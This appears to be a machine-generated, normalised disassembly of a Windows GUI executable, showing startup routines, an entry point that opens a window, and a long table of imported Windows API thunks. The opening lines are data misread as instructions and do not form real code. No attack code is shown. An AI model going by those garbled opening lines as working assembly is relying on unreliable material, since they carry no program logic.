add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
dec dx
add ah dl
out dx eax
inc ebp
add al ch
dec dx
add [ eax - 0x1fffb9e2 ] dh
dec dx
add [ ebx + edi * 8 + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x52
dec edx
dec edx
add [ esi + ebx ] bl
dec eax
add [ eax + 0x48004a69 ] dl
daa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x69 ] al
dec edx
add [ eax + ecx * 2 + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x4a ] dl
add [ eax ] dl
pop [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
imul ecx [ edx ] sub_47f5b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebp [ ecx + 0x4a ]
add [ esi + ecx * 2 + 0x48 ] dl
sub_4a6000
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_402b04
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_405f4c
call sub_403d2c
test al al
je r-xdata
call sub_403e20
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013a8
mov [ rw-data ] eax
call GetACP
mov [ rw-data ] eax
call sub_401390
mov [ rw-data ] eax
call sub_403d5c
sub_4a60ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4a611e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a6125
retn
mov eax sub_40fa0c
call sub_404b30
mov eax r-xdata
call sub_404b58
cmp [ rw-data ] 0x0
je r-xdata
call sub_40e268
mov eax r-xdata
call sub_406994
call sub_40e36c
call sub_40f424
call sub_40ec24
mov eax rw-data
mov edx r-xdata
call sub_404e98
sub_4a6144
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4046f8#4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a61ec
retn
mov eax rw-data
call sub_412aec
mov eax sub_4110f4
mov [ rw-data ] eax
mov eax sub_410d1c
mov [ rw-data ] eax
mov edx sub_410c2c
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_4113f4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4127e0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_411708
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_411a3c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41215c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4a61f8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4046f8#3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a6288
retn
call sub_41d1e0
mov eax sub_41eaec
call sub_406984
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f5e8
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_406b0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4158a4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a38
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a38
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_4a62b4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a288
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42a304
mov cx 0x30
mov dl 0x1
mov eax [ r-xdata ]
call sub_4228cc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4228cc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_4228cc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a4e0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a38
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a38
mov [ rw-data ] eax
mov ecx sub_423150
mov edx sub_423160
mov eax [ sub_42187c ]
call sub_416188
mov ecx r-xdata
mov edx sub_423368
mov eax [ r-xdata ]
call sub_416188
sub_4a63d4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40710c
xor edx edx
mov [ eax + 0x10 ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x14 ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x18 ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x1c ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x20 ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x24 ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x28 ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x2c ] edx
call sub_40710c
xor edx edx
mov [ eax + 0x30 ] edx
sub_4a6497
add [ ebx + 0x4af4882d ] al
add [ ecx ] al
jae r-xdata
retn
mov eax r-xdata
call sub_404b58
call sub_42e864
mov eax [ r-xdata ]
call sub_415ffc
mov eax [ r-xdata ]
call sub_41609c
mov edx [ r-xdata ]
mov eax [ sub_42e3a0 ]
call sub_416048
sub_4a6548
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4362e4
call sub_404b30
mov eax [ r-xdata ]
call sub_415ffc
mov eax [ r-xdata ]
call sub_41609c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
mov eax [ r-xdata ]
call sub_415f40
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ef28
mov [ rw-data ] eax
sub_4a65d0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4046f8#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a665d
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4491fc
mov eax [ r-xdata ]
call sub_415ffc
mov eax [ r-xdata ]
call sub_41609c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
sub_4a668c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45a084
call sub_404b58
call sub_459f9c
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44e560
call sub_4162b4
xor eax eax
mov [ rw-data ] eax
sub_4a66f8
push ebp
mov ebp esp
add esp 0xffffffe0
sub [ rw-data ] 0x1
jae r-xdata
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_4625d0
lea eax [ ebp - 0x20 ]
mov edx r-xdata
mov cl 0x20
call sub_403a24
jne r-xdata
mov [ rw-data ] sub_464674
mov [ rw-data ] sub_46466c
jmp r-xdata
sub_4a6850
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4a6915
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a691c
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x4 ]
call sub_4706d0
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404e98
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ rw-data ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax * 4 ]
mov edx r-xdata
call sub_404e98
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ rw-data ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax * 4 ]
mov edx r-xdata
call sub_404e98
sub_4a6a20
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push j_sub_4046f8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a6aaf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
call sub_48bfdc
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_426478
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_426478
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_407158
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4587ec
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_458804
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0x5b ] 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call ShowWindow
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458884
call sub_404c9c
sub_40116b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_406bc8
sub_401175
add [ esp + 0x4 ] 0xfffffff8
jmp sub_406bdc
sub_401220
jmp [ rw-data ]
sub_401228
jmp [ rw-data ]
GetFileType
jmp [ GetFileType@IAT ]
sub_401238
jmp [ rw-data ]
sub_401250
jmp [ rw-data ]
sub_401260
jmp [ rw-data ]
sub_401288
jmp [ rw-data ]
sub_401290
jmp [ rw-data ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_4012a8
jmp [ rw-data ]
sub_4012b0
jmp [ rw-data ]
sub_4012b8
jmp [ rw-data ]
sub_4012c0
jmp [ rw-data ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_4012d8
jmp [ rw-data ]
sub_4012e0
jmp [ rw-data ]
sub_4012e8
jmp [ rw-data ]
sub_4012f0
jmp [ rw-data ]
sub_4012f8
jmp [ rw-data ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_401308
jmp [ rw-data ]
sub_401318
jmp [ rw-data ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_401338
jmp [ rw-data ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_401360
jmp [ rw-data ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_401380
jmp [ rw-data ]
sub_401388
jmp [ rw-data ]
sub_401390
jmp [ rw-data ]
sub_401398
jmp [ rw-data ]
sub_4013a0
jmp [ rw-data ]
sub_4013a8
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_4013cc
jmp [ rw-data ]
sub_4013e4
jmp [ rw-data ]
sub_401454
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
sub_401468
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_4014b4
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x20 ] ecx
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_4016e2
retn
sub_402dcc
call sub_40710c
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_40710c
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402e20
mov [ rw-data ] edx
call sub_404d78
sub_402ea0
retn
sub_402eb4
call sub_4012d8
call sub_402ea4
retn
sub_402f00
retn
sub_402f7c
push ebx
call sub_40710c
mov ebx [ eax + 0x4 ]
call sub_40710c
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_403248
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_403258
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_403328
push ebx
mov ebx eax
push ebx
call sub_401220
dec eax
sete al
pop ebx
retn
sub_403503
retn
sub_4035b4
mov edx [ eax + 0x1c ]
call sub_40356c
retn
sub_4039f4
mov ecx 0xff
call sub_403a00
retn
sub_403a24
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_403a40
jmp sub_403a40
sub_403a3d
retn
sub_403dcd
jmp sub_4046f8
sub_403e20
fninit
fwait
fldcw [ rw-data ]
retn
sub_403edf
jmp sub_4046f8
sub_403ee6
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403ef0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403efc
push ebx
mov ebx eax
mov eax ebx
call sub_403f2c
call sub_402d28
mov edx eax
mov eax ebx
call sub_403f70
pop ebx
retn
sub_403f18
push ebx
mov ebx eax
mov eax ebx
call sub_403fc8
mov eax ebx
call sub_402d44
pop ebx
retn
sub_403f2c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403f54
call sub_404330
test dl dl
jle r-xdata
retn
call sub_4042d8
sub_404014
retn
sub_40409c
jmp sub_4046f8
sub_4040a3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4041ac
mov eax 0x8000ffff
retn
sub_4041b4
retn
sub_4041b8
retn
sub_4041bc
retn
sub_4042b1
jmp sub_404444
sub_4042b6
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_404800
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4042d8
sub_4042d8
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40430f
jmp sub_404444
sub_404330
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_404340
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_404408
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_404424
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_40477d
call sub_40710c
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ecx + 0x8 ]
jmp sub_403f64
sub_404899
retn
sub_4049dc
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_404a6d
jmp sub_404444
sub_404ad5
jmp sub_404444
sub_404af0
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_4049dc
mov [ rw-data ] 0x0
call sub_404a88
retn
sub_404c0d
retn
sub_404d73
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404d78
mov [ rw-data ] eax
call sub_404c9c
sub_404e28
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call ExitThread
mov eax ebx
call [ rw-data ]
sub_405068
retn
sub_4050a4
retn
sub_4050b2
retn
sub_4050cb
retn
sub_4050e4
retn
sub_4050f8
retn
sub_4051e3
retn
j_sub_405330#2
jmp sub_405330
sub_405379
retn
sub_405381
retn
sub_4053c3
retn
sub_405644
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402e78
sub_40565c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4057b8
retn
sub_4057ca
retn
sub_4057cc
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_405a98
mov ecx 0x1
jmp sub_405a04
sub_405aa2
retn
sub_405ad8
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402e78
call [ rw-data ]
retn
sub_405bdc
mov ecx 0x1
jmp sub_405af0
sub_405be6
retn
sub_405c18
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402e78
call [ rw-data ]
retn
sub_405cf0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402e78
call [ rw-data ]
retn
sub_405f16
retn
sub_405f18
push edx
call sub_402d28
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_405a98
pop eax
sub_405f2c
push eax
call sub_405bdc
pop eax
call sub_402d44
retn
sub_405f44
xchg edx eax
call sub_40506c
retn
sub_405f4c
mov al 0x11
jmp sub_402e78
sub_405f77
retn
sub_405f9b
retn
sub_40602d
retn
sub_406258
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_405e24
pop ebp
retn 0x4
j_sub_405af0
jmp sub_405af0
sub_40626d
retn
sub_406270
call sub_406410
retn
sub_406474
test eax eax
je r-xdata
retn
[ eax - 0x8 ]
sub_4064a8
call sub_406480
retn
sub_406819
jmp sub_4046f8
sub_406984
call sub_406994
retn
sub_40698c
call sub_4069b4
retn
sub_406994
push ebx
mov ebx eax
mov eax 0x8
call sub_402d28
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_406a53
jmp sub_404444
sub_406a74
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_406ae8
jmp sub_4046f8
sub_406aef
pop ecx
pop ebp
retn
sub_406b68
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_406b74
add eax 0x4
push eax
call sub_401388
retn
sub_406b80
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402e78
sub_406b90
call sub_403efc
mov [ eax + 0x4 ] 0x1
retn
sub_406bc8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_401380
pop ebp
retn 0x4
sub_406ebc
jmp sub_4046f8
sub_406ec3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_406f77
jmp sub_4046f8
sub_406f7e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_406fc7
jmp sub_4046f8
sub_406fce
pop esi
pop ebx
pop ecx
pop ebp
retn
GetACP
jmp [ GetACP@IAT ]
sub_407088
jmp sub_4046f8
sub_40708f
pop ebp
retn
sub_407094
jmp [ rw-data ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_4070b4
push eax
push 0x40
call LocalAlloc
retn
sub_4070c0
mov eax 0x34
retn
sub_40714c
mov eax rw-data
call sub_406a74
retn
sub_40719c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4071b8
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_4071c0
push ecx
mov edx eax
and dx 0xffff
mov [ esp ] dx
shr eax 0x10
mov [ esp + 0x2 ] ax
mov eax [ esp ]
pop edx
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegCreateKeyExA
jmp [ RegCreateKeyExA@IAT ]
RegDeleteKeyA
jmp [ RegDeleteKeyA@IAT ]
RegDeleteValueA
jmp [ RegDeleteValueA@IAT ]
RegEnumKeyExA
jmp [ RegEnumKeyExA@IAT ]
RegEnumValueA
jmp [ RegEnumValueA@IAT ]
RegFlushKey
jmp [ RegFlushKey@IAT ]
RegQueryInfoKeyA
jmp [ RegQueryInfoKeyA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
RegSetValueExA
jmp [ RegSetValueExA@IAT ]
CreateDirectoryA
jmp [ CreateDirectoryA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetDriveTypeA
jmp [ GetDriveTypeA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetLogicalDriveStringsA
jmp [ GetLogicalDriveStringsA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetPriorityClass
jmp [ GetPriorityClass@IAT ]
GetSystemDefaultLangID
jmp [ GetSystemDefaultLangID@IAT ]
GetSystemDirectoryA
jmp [ GetSystemDirectoryA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetSystemTime
jmp [ GetSystemTime@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetThreadPriority
jmp [ GetThreadPriority@IAT ]
GetTimeZoneInformation
jmp [ GetTimeZoneInformation@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GetVolumeInformationA
jmp [ GetVolumeInformationA@IAT ]
GetWindowsDirectoryA
jmp [ GetWindowsDirectoryA@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
OpenProcess
jmp [ OpenProcess@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
QueryPerformanceFrequency
jmp [ QueryPerformanceFrequency@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetConsoleCP
jmp [ SetConsoleCP@IAT ]
SetConsoleOutputCP
jmp [ SetConsoleOutputCP@IAT ]
SetCurrentDirectoryA
jmp [ SetCurrentDirectoryA@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFileAttributesA
jmp [ SetFileAttributesA@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_4075c0
jmp [ rw-data ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
VerLanguageNameA
jmp [ VerLanguageNameA@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
WNetEnumResourceA
jmp [ WNetEnumResourceA@IAT ]
WNetOpenEnumA
jmp [ WNetOpenEnumA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
GdiFlush
jmp [ GdiFlush@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetRgnBox
jmp [ GetRgnBox@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
